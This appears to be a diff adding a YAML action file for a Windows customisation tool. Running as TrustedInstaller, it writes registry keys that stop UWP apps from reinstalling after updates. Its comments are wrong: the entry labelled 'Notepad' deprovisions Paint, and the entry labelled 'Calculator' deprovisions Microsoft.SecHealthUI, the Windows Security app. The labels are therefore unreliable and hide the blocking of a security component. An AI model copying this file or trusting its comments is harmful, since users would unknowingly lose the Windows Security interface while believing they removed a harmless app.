@@ -1,0 +1,10 @@
+---
+title: configure-deprovisioned-apps
+description: Prevents some UWP packages from installing after updating Windows
+privilege: TrustedInstaller
+actions:
+
+  # -------> Notepad
+- !registryKey: {path: 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\Deprovisioned\Microsoft.Paint_8wekyb3d8bbwe', operation: add}
+  # -------> Calculator
+- !registryKey: {path: 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\Deprovisioned\Microsoft.SecHealthUI_8wekyb3d8bbwe', operation: add}
